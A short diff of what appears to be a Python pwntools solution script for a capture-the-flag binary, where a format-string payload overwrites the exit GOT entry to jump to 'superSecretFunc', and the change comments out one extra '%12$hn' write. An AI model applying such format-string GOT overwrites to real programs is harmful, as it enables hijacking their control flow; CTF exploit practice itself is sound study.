@@ -67,7 +67,7 @@ if __name__ == "__main__":
     #  DEBUG([0x80486D5])
 
     buf = p32(elf.sym['retAddr']) + p32(elf.got['exit']) + "%{}c%{}$hn".format((elf.sym['superSecretFunc'] & 0xffff) - 8, 13)
-    buf += "%12$hn"
+    #  buf += "%12$hn"
     print hexdump(buf)
     io.sendafter("please\n", encrypt(buf))
     
